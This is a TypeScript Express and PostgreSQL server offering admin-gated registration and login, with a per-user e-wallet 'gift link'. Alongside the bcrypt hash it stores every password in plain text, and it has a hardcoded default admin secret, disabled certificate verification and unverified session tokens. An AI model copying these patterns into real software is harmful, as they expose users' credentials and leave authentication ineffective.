import express from 'express';
import { createServer as createViteServer } from 'vite';
import { Pool } from 'pg';
import bcrypt from 'bcryptjs';
import crypto from 'crypto';

const app = express();
const PORT = 3000;

// Middleware to parse JSON bodies
app.use(express.json());

// Initialize Database Connection Pool
// We use a connection pool to manage multiple concurrent requests efficiently.
// The connection string comes from the environment variable DATABASE_URL.
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
});

// Create Users Table if it doesn't exist
const initDb = async () => {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        username TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        gift_link TEXT,
        plain_password TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);
    console.log('Database initialized successfully');
  } catch (err) {
    console.error('Error initializing database:', err);
    if (!process.env.DATABASE_URL) {
      console.warn('WARNING: DATABASE_URL environment variable is not set. Database operations will fail.');
    }
  }
};

initDb();

// In-memory rate limiter
const loginAttempts = new Map<string, { count: number; lastAttempt: number }>();
const BLOCK_DURATION = 60 * 1000; // 1 minute
const MAX_ATTEMPTS = 5;

// API Routes

// Register Endpoint
app.post('/api/register', async (req, res) => {
  const { username, password, gift_link, admin_secret } = req.body;

  // 1. SECURITY CHECK
  // Default 'rahasia123' for local dev if env not set
  const validSecret = process.env.ADMIN_SECRET || 'rahasia123';
  
  if (admin_secret !== validSecret) {
    return res.status(401).json({ success: false, message: 'Unauthorized: Wrong Admin Secret' });
  }

  if (!username || !password) {
    return res.status(400).json({ success: false, message: 'Username and password required' });
  }

  if (password.length < 8) {
    return res.status(400).json({ success: false, message: 'Password must be at least 8 characters' });
  }

  try {
    // Check if user exists
    const checkResult = await pool.query('SELECT id FROM users WHERE username = $1', [username]);
    
    if (checkResult.rows.length > 0) {
      return res.status(409).json({ success: false, message: 'Username already taken' });
    }

    // Hash password
    const saltRounds = 10;
    const hash = await bcrypt.hash(password, saltRounds);

    // Insert user
    const link = gift_link || 'https://link.dana.id/kaget/default';
    await pool.query('INSERT INTO users (username, password_hash, gift_link, plain_password) VALUES ($1, $2, $3, $4)', [username, hash, link, password]);

    // Artificial delay for security feel
    await new Promise(resolve => setTimeout(resolve, 800));

    return res.json({ success: true, message: 'Registration successful' });
  } catch (error) {
    console.error('Registration error:', error);
    return res.status(500).json({ success: false, message: 'Internal server error' });
  }
});

// Login Endpoint
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  const ip = req.ip || 'unknown';
  
  // Rate Limiting Logic
  const now = Date.now();
  const attempts = loginAttempts.get(ip) || { count: 0, lastAttempt: 0 };

  if (attempts.count >= MAX_ATTEMPTS) {
    if (now - attempts.lastAttempt < BLOCK_DURATION) {
      const remaining = Math.ceil((BLOCK_DURATION - (now - attempts.lastAttempt)) / 1000);
      return res.status(429).json({ 
        success: false, 
        message: `Too many attempts. Try again in ${remaining}s.` 
      });
    } else {
      attempts.count = 0;
    }
  }

  // Artificial delay
  await new Promise(resolve => setTimeout(resolve, 500 + Math.random() * 500));

  if (!username || !password) {
    return res.status(400).json({ success: false, message: 'Username and password required' });
  }

  try {
    const result = await pool.query('SELECT * FROM users WHERE username = $1', [username]);
    const user = result.rows[0];

    if (!user) {
      // Increment attempts
      attempts.count++;
      attempts.lastAttempt = now;
      loginAttempts.set(ip, attempts);
      return res.status(401).json({ success: false, message: 'Invalid credentials' });
    }

    const match = await bcrypt.compare(password, user.password_hash);

    if (match) {
      // Reset attempts on success
      loginAttempts.delete(ip);
      return res.json({ 
        success: true, 
        token: crypto.randomUUID(),
        username: user.username 
      });
    } else {
      // Increment attempts
      attempts.count++;
      attempts.lastAttempt = now;
      loginAttempts.set(ip, attempts);
      return res.status(401).json({ success: false, message: 'Invalid credentials' });
    }
  } catch (error) {
    console.error('Login error:', error);
    return res.status(500).json({ success: false, message: 'Internal server error' });
  }
});

// Vite middleware setup
async function startServer() {
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    app.use(express.static('dist'));
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
